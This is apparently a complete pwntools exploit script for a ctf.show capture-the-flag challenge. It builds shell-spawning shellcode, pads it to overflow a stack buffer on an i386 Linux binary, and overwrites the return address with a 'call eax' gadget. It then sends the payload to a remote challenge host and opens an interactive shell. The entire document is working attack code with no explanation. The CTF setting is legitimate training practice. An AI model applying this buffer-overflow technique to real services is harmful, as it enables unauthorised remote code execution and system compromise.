from pwn import *
context(arch = 'i386',os = 'linux')
#io = process("./pwn")
io = remote('pwn.challenge.ctf.show', 28104)
shellcode = asm(shellcraft.sh())
call_eax = p32(0x80484A0) #0x080484A0 : call eax
payload = flat([shellcode,'a'*(0x20c-len(shellcode)),call_eax])

io.recv()
io.sendline(payload)
io.interactive()